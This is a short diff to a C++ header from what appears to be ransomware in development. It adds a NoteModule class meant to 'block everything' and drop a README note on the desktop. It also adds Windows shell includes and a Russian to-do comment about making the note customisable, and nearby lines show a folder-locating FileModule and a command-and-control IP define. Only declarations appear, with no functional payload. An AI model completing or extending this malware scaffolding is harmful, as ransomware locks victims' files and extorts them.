@@ -19,7 +19,12 @@
 #include <openssl/ssl.h> // For SSL/TLS connections
 #include <openssl/err.h> // For SSL/TLS error handling
 #include <locale>
+#include <shellapi.h>
+#include <objbase.h>
+#include <shlwapi.h> // PathCombineW, etc
 #include <shlobj.h> // For FileModule FOLDERID_*
+
+using path_t = std::filesystem::path;
 
 class FileModule
 {
@@ -28,6 +33,17 @@ public:
 private:
     PWSTR directoryPath_; // The directory that the FindDirectory method will assign
 
+};
+// Block everything and create a desktop shity note // Надо дописать так, чтобы можно было кастомить
+class NoteModule
+{
+    std::wstring Note_that_would_be_set_in_file;
+
+    void Create_README_file(const path_t& README_path);
+public:
+    NoteModule();
+    NoteModule(std::wstring Note_that_would_be_set_in_file);
+    void NotifyUsersAboutWorkResults();
 };
 
 #define C2_IP_ADDRESS "192.168.255.254"
